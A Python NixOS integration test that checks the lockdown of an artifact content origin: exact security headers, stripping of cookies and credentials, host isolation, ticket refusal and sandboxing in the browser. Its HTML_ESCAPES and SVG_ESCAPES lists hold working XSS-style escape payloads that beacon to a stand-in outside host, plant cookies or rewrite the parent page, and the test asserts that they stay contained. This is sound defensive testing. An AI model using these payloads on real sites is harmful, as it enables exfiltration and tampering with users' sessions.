# Artifact content origin lockdown (plan §6, NixOS machine test 1).
# Injected by Nix: browser_probe, seed_script, ticket_script, payload_script,
# content_host, public_host, outside_host. `web` is the single fixture node.
import base64
import json
import shlex
import tempfile
from pathlib import Path

from hegel import TestCase, given, integers, lists, sampled_from, text

CA = "/run/overalls-test/ca.crt"
CONTENT = f"https://{content_host}"
MARSHALL = f"https://{public_host}"
OUTSIDE = f"http://{outside_host}:8081"

LOCKDOWN: dict[str, str] = {
    "content-security-policy": (
        "sandbox allow-scripts; default-src 'none'; "
        f"script-src 'unsafe-inline' {CONTENT}; style-src 'unsafe-inline' {CONTENT}; "
        f"img-src data: blob: {CONTENT}; font-src {CONTENT}; media-src {CONTENT}; "
        "connect-src 'none'; worker-src 'none'; manifest-src 'none'; frame-src 'none'; "
        "child-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'; "
        f"frame-ancestors {MARSHALL}"
    ),
    "cross-origin-opener-policy": "same-origin",
    "cross-origin-resource-policy": "same-site",
    "cross-origin-embedder-policy": "require-corp",
    "permissions-policy": (
        "accelerometer=(), autoplay=(), bluetooth=(), camera=(), clipboard-read=(), "
        "clipboard-write=(), display-capture=(), fullscreen=(), geolocation=(), gyroscope=(), "
        "hid=(), magnetometer=(), microphone=(), midi=(), payment=(), "
        "publickey-credentials-get=(), screen-wake-lock=(), serial=(), usb=(), "
        "xr-spatial-tracking=()"
    ),
    "x-content-type-options": "nosniff",
    "referrer-policy": "no-referrer",
    "cache-control": "private, no-store",
    "strict-transport-security": "max-age=63072000",
}


class Response:
    def __init__(self, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
        self.status = status
        self.headers = headers
        self.body = body

    def values(self, name: str) -> list[str]:
        return [value for key, value in self.headers if key == name]


def request(url: str, method: str = "GET", headers: tuple[str, ...] = ()) -> Response:
    """Issue one HTTP/1.1 request from inside the VM; ticket-bearing URLs and
    responses stay in private files and are never printed by this helper."""
    arguments = [
        "curl",
        "--silent",
        "--show-error",
        "--http1.1",
        "--cacert",
        CA,
        "--max-time",
        "20",
        "--output",
        "/run/artifact-origin-response/body",
        "--dump-header",
        "/run/artifact-origin-response/headers",
        "--write-out",
        "%{http_code}",
    ]
    if method == "HEAD":
        arguments.append("--head")
    else:
        arguments += ["--request", method]
    for header in headers:
        arguments += ["--header", header]
    status = int(web.succeed(shlex.join([*arguments, url])).strip())
    raw_headers = web.succeed("cat /run/artifact-origin-response/headers")
    parsed: list[tuple[str, str]] = []
    for line in raw_headers.splitlines()[1:]:
        if ":" in line:
            name, value = line.split(":", 1)
            parsed.append((name.strip().lower(), value.strip()))
    if method == "HEAD":
        # curl --head writes the header block to --output and never reads a
        # body, so a HEAD response's body is empty by construction.
        return Response(status, parsed, b"")
    body = web.succeed("base64 -w0 /run/artifact-origin-response/body").strip()
    return Response(status, parsed, base64.b64decode(body))


def assert_lockdown(response: Response, context: str) -> None:
    """@cc [owner:ghuntley,label:verification;security] artifact-origin-exact-headers
    Each lockdown header MUST appear exactly once with exactly the specified
    value, and no Set-Cookie may leave the proxy, on every content response.
    """
    for name, expected in LOCKDOWN.items():
        assert response.values(name) == [expected], f"{context}: {name} is not exact"
    assert response.values("set-cookie") == [], f"{context}: Set-Cookie reached the client"
    assert response.values("x-frame-options") == [], f"{context}: unexpected X-Frame-Options"


def ticket(kind: str) -> str:
    web.succeed(
        f"ARTIFACT_TICKET_KIND={shlex.quote(kind)} artifact-origin-eval {shlex.quote(ticket_script)}",
        timeout=180,
    )
    return web.succeed(f"cat /run/overalls-test/artifact-ticket-{kind}").strip()


def outside_hits() -> str:
    return web.succeed("cat /run/artifact-origin-outside/hits").strip()


start_all()
web.wait_for_unit("postgresql-setup.service")
web.succeed("systemctl start overalls-test-migrate.service")
web.wait_until_succeeds(f"curl --fail --silent --cacert {CA} {MARSHALL}/health/ready", timeout=180)
web.wait_for_unit("artifact-origin-outside.service")
web.succeed("install -d -m 0700 /run/artifact-origin-response")
web.succeed(f"artifact-origin-eval {shlex.quote(seed_script)}", timeout=180)
web.succeed("mkdir -p /root/.pki/nssdb; certutil -N --empty-password -d sql:/root/.pki/nssdb")
web.succeed(f"certutil -A -d sql:/root/.pki/nssdb -n overalls-fixture -t C,, -i {CA}")
valid = ticket("valid")
state = json.loads(web.succeed("cat /run/overalls-test/artifact-origin.json"))
artifact_id = str(state["artifact_id"])

with subtest("content responses carry the exact lockdown headers and never set cookies"):
    page = request(f"{CONTENT}/v/{valid}/")
    assert page.status == 200, page.status
    assert b"ARTIFACT-ORIGIN-MARKER" in page.body
    assert page.values("content-type")[0].startswith("text/html")
    assert_lockdown(page, "page")
    head = request(f"{CONTENT}/v/{valid}/", method="HEAD")
    assert head.status == 200, head.status
    assert_lockdown(head, "head")
    svg = request(f"{CONTENT}/v/{valid}/image.svg")
    assert svg.status == 200 and svg.values("content-type")[0].startswith("image/svg+xml")
    assert_lockdown(svg, "svg")
    for path in ["/v/" + valid + "/missing.txt", "/", "/health/ready", "/health/live", "/nope"]:
        missing = request(CONTENT + path)
        assert missing.status == 404, (path, missing.status)
        assert missing.values("content-type")[0].startswith("text/plain")
        assert b"ARTIFACT-ORIGIN-MARKER" not in missing.body
        assert_lockdown(missing, "not found")

with subtest("the proxy strips client credentials and every backend Set-Cookie"):
    echoed = request(
        f"{CONTENT}/v/{valid}/__echo",
        headers=("Cookie: __Host-marshall=forged", "Authorization: Bearer forged"),
    )
    assert echoed.status == 200, echoed.status
    # The echo body holds two booleans only, so its prefix is safe to report.
    assert json.loads(echoed.body) == {"cookie": False, "authorization": False}
    assert_lockdown(echoed, "echo")
    # The same request straight to the backend proves the fixture can observe
    # both leaks, so the proxy (not the fixture) is what removed them.
    direct = request(
        f"https://localhost:6443/v/{valid}/__echo",
        headers=(
            f"Host: {content_host}",
            "Cookie: __Host-marshall=forged",
            "Authorization: Bearer forged",
        ),
    )
    assert direct.status == 200, direct.status
    assert json.loads(direct.body) == {"cookie": True, "authorization": True}
    assert direct.values("set-cookie") == ["probe=1"], "backend probe cookie missing"

with subtest("only GET and HEAD reach the content host"):
    for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
        refused = request(f"{CONTENT}/v/{valid}/", method=method)
        assert refused.status == 405, (method, refused.status)
        assert b"ARTIFACT-ORIGIN-MARKER" not in refused.body

with subtest("each host reaches only its own backend"):
    marshall_view = request(f"{MARSHALL}/v/{valid}/")
    assert marshall_view.status in (404, 421), marshall_view.status
    assert b"ARTIFACT-ORIGIN-MARKER" not in marshall_view.body
    # SNI for the content host with Marshall's Host header stays on Marshall.
    crossed = request(f"{CONTENT}/v/{valid}/", headers=(f"Host: {public_host}",))
    assert crossed.status in (404, 421), crossed.status
    assert b"ARTIFACT-ORIGIN-MARKER" not in crossed.body
    for path in ["/users/log_in", "/overview", "/artifacts", "/live/websocket"]:
        foreign = request(CONTENT + path)
        assert foreign.status == 404, (path, foreign.status)
        assert_lockdown(foreign, "marshall route on content host")
    unknown = request(f"{CONTENT}/v/{valid}/", headers=("Host: other.example.test",))
    assert unknown.status == 421, unknown.status

with subtest("downloads and sniffing follow the closed MIME allowlist"):
    sniff = request(f"{CONTENT}/v/{valid}/sniff.txt")
    assert sniff.status == 200 and sniff.values("content-type")[0].startswith("text/plain")
    assert_lockdown(sniff, "sniff")
    binary = request(f"{CONTENT}/v/{valid}/payload.exe")
    assert binary.status == 200, binary.status
    assert binary.values("content-type") == ["application/octet-stream"]
    assert binary.values("content-disposition")[0].startswith("attachment")
    assert_lockdown(binary, "download")

with subtest("expired, revoked, wrong-version and other users' tickets are refused"):
    for kind in ["expired", "revoked", "wrong_version", "other_user"]:
        refused_ticket = ticket(kind)
        for path in ["", "image.svg"]:
            refusal = request(f"{CONTENT}/v/{refused_ticket}/{path}")
            assert refusal.status in (403, 404, 410), (kind, refusal.status)
            assert b"ARTIFACT-ORIGIN-MARKER" not in refusal.body
            assert b"ARTIFACT-ORIGIN-SVG" not in refusal.body
            assert_lockdown(refusal, f"{kind} ticket")
    malformed = request(f"{CONTENT}/v/not-a-ticket/")
    assert malformed.status == 404
    assert_lockdown(malformed, "malformed ticket")

with subtest("direct visits and Marshall-hosted iframes are opaque, offline origins"):
    web.succeed(f"curl --fail --silent {OUTSIDE}/reset")
    web.succeed(f"{browser_probe} login", timeout=180)
    valid = ticket("valid")
    web.succeed(f"{browser_probe} baseline", timeout=300)
    web.succeed(f"{browser_probe} foreign-embedding", timeout=120)
    web.succeed(f"{browser_probe} sniffing", timeout=120)
    hits = outside_hits()
    assert hits == "", ("an artifact reached the outside origin", hits)

with subtest("the content listener stays off the public interfaces"):
    listeners = web.succeed("ss -Htlnp")
    assert "0.0.0.0:6443" not in listeners and "*:6443" not in listeners


HTML_ESCAPES = [
    f'<script>fetch("{OUTSIDE}/fetch")</script>',
    f'<script>navigator.sendBeacon("{OUTSIDE}/beacon")</script>',
    f'<script>new EventSource("{OUTSIDE}/events")</script>',
    f'<script>try{{new WebSocket("ws://{outside_host}:8081/socket")}}catch(e){{}}</script>',
    f'<script>window.open("{OUTSIDE}/popup")</script>',
    f'<script>try{{top.location.href="{OUTSIDE}/top"}}catch(e){{}}</script>',
    '<script>try{document.cookie="planted=1; domain=example.test; path=/"}catch(e){}</script>',
    f'<script>try{{parent.document.body.innerHTML="<img src={OUTSIDE}/parent>"}}catch(e){{}}</script>',
    f'<form action="{OUTSIDE}/form"><input name="q"></form><script>document.forms[0].submit()</script>',
    f'<img src="{OUTSIDE}/img">',
    f'<link rel="stylesheet" href="{OUTSIDE}/style.css">',
    f'<link rel="prefetch" href="{OUTSIDE}/prefetch">',
    f'<script src="{OUTSIDE}/script.js"></script>',
    f'<style>@import url("{OUTSIDE}/import.css"); body{{background:url("{OUTSIDE}/bg")}}</style>',
    f'<style>@font-face{{font-family:x;src:url("{OUTSIDE}/font")}} p{{font-family:x}}</style><p>x</p>',
    f'<object data="{OUTSIDE}/object"></object>',
    f'<embed src="{OUTSIDE}/embed-src">',
    f'<iframe src="{OUTSIDE}/frame"></iframe>',
    f'<iframe src="{MARSHALL}/overview"></iframe>',
    f'<video src="{OUTSIDE}/video"></video>',
    f'<base href="{OUTSIDE}/"><img src="relative">',
    '<script>try{new Worker("data:text/javascript,1")}catch(e){}</script>',
    '<script>try{navigator.serviceWorker.register("sw.js")}catch(e){}</script>',
    '<script>try{localStorage.setItem("k","v")}catch(e){}</script>',
    '<script>parent.postMessage({type:"storage_set",key:"k",value:"v"},"*")</script>',
    f'<svg><image href="{OUTSIDE}/svg-image"/></svg>',
]

SVG_ESCAPES = [
    f'<script>fetch("{OUTSIDE}/svg-fetch")</script>',
    f'<image href="{OUTSIDE}/svg-image"/>',
    f'<foreignObject><img xmlns="http://www.w3.org/1999/xhtml" src="{OUTSIDE}/svg-foreign"/></foreignObject>',
    f'<script>try{{top.location.href="{OUTSIDE}/svg-top"}}catch(e){{}}</script>',
    '<script>try{document.cookie="planted=1; domain=example.test"}catch(e){}</script>',
    f'<a href="{OUTSIDE}/svg-link" target="_top"><rect width="4" height="4"/></a>'
    "<script>document.querySelector(&quot;a&quot;)</script>",
    f'<use href="{OUTSIDE}/sprite.svg#x"/>',
    f'<style>@import url("{OUTSIDE}/svg-import.css");</style>',
    f'<set attributeName="href" to="{OUTSIDE}/svg-set"/>',
]

NOISE = "abcdefghijklmnopqrstuvwxyz0123456789 <>&\"'=/;:-_é中‮"


def escape_noise(raw: str) -> str:
    return raw.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


@given(
    kind=sampled_from(["html", "svg"]),
    html_parts=lists(sampled_from(HTML_ESCAPES), min_size=1, max_size=4),
    svg_parts=lists(sampled_from(SVG_ESCAPES), min_size=1, max_size=4),
    noise=text(alphabet=NOISE, max_size=40),
    repeat=integers(min_value=1, max_value=3),
)
def artifact_escape_payloads_stay_isolated(
    tc: TestCase,
    kind: str,
    html_parts: list[str],
    svg_parts: list[str],
    noise: str,
    repeat: int,
) -> None:
    """@cc [owner:ghuntley,label:verification;security] artifact-origin-escape-payloads
    For every generated HTML or SVG escape payload, through the real proxy and
    browser, the response MUST keep the exact lockdown headers, no request may
    reach the outside origin, Marshall's page and cookies MUST be unchanged and
    the browser MUST send no credentials to the content host.
    """
    filler = escape_noise(noise)
    if kind == "html":
        body = (
            "<!doctype html><title>payload</title><p>"
            + filler
            + "</p>"
            + "".join(html_parts * repeat)
        )
        path = ""
    else:
        body = (
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" width="8" height="8">'
            "<desc>" + filler + "</desc>" + "".join(svg_parts * repeat) + "</svg>"
        )
        path = "payload.svg"
    tc.note(f"kind={kind} parts={len(html_parts if kind == 'html' else svg_parts)}")
    with tempfile.TemporaryDirectory() as directory:
        source = Path(directory) / "artifact-payload.json"
        source.write_text(json.dumps({"kind": kind, "body": body}))
        web.copy_from_host(str(source), "/run/overalls-test/artifact-payload.json")
    web.succeed("chmod 0600 /run/overalls-test/artifact-payload.json")
    web.succeed(f"curl --fail --silent {OUTSIDE}/reset")
    web.succeed(f"artifact-origin-eval {shlex.quote(payload_script)}", timeout=180)
    payload_ticket = web.succeed("cat /run/overalls-test/artifact-payload-ticket").strip()
    served = request(f"{CONTENT}/v/{payload_ticket}/{path}")
    assert served.status == 200, served.status
    assert_lockdown(served, "payload")
    web.succeed(f"{browser_probe} payload {shlex.quote(path)}", timeout=180)
    hits = outside_hits()
    assert hits == "", ("a generated payload reached the outside origin", hits)
